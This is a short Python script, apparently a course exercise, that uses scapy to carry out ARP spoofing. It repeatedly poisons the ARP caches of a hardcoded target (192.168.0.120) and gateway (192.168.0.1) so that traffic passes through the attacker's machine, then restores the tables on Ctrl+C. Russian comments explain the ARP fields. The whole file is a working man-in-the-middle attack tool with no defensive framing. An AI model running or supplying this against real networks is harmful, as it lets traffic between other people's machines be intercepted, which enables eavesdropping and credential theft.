#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    pasket = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pasket, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.0.120"
gatewey_ip = "192.168.0.1"

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gatewey_ip)
        spoof(gatewey_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        # print(f"\r[+] Packet sent : {sent_packet_count}"),
        print("\r[+] Packet sent: " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[-] Detected CNTR + C ......... Resetting ARP tables ....... Please wait.\n.')
    restore(target_ip, gatewey_ip)




# выведет все параметры arp
# op 1 - arp запрос, 2 - arp ответ
# pdst - поле с ip целевой пк
# hwdst мак адресс цели
# psrc поле источника для макдресс роутер
# verbose=False - аргумент scapy, вывод на экран действия